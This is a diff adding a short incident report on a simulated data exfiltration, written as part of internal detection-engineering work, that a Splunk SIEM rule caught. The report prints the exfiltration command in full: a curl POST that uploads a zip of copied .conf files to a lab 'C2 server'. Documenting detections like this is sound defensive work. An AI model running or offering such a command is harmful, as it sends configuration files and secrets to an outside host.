@@ -1,0 +1,17 @@
+Incident ID: 2025-EXF-T1041
+Date: 27/06/2025
+Detected by: Splunk SIEM
+Detection Type: Data Exfiltration over C2 Channel (HTTP POST via curl)
+
+Summary:
+A suspicious data exfiltration attempt was detected where `.conf` files were copied to `/tmp/exfil/`, compressed into a zip file, and uploaded to a remote server using curl's POST method.
+
+Artifacts:
+- Command: curl -X POST -F "file=@data_loot.zip" http://192.168.177.128:8000/upload
+- Source IP: 192.168.177.130 (SIEM server)
+- Destination IP: 192.168.177.128 (C2 server)
+- Evidence from: `.bash_history`, `/var/log/syslog`
+
+Action Taken:
+- Detected via Splunk rule for curl/wget with POST/filename parameters
+- No real data exposed; part of internal detection engineering simulation
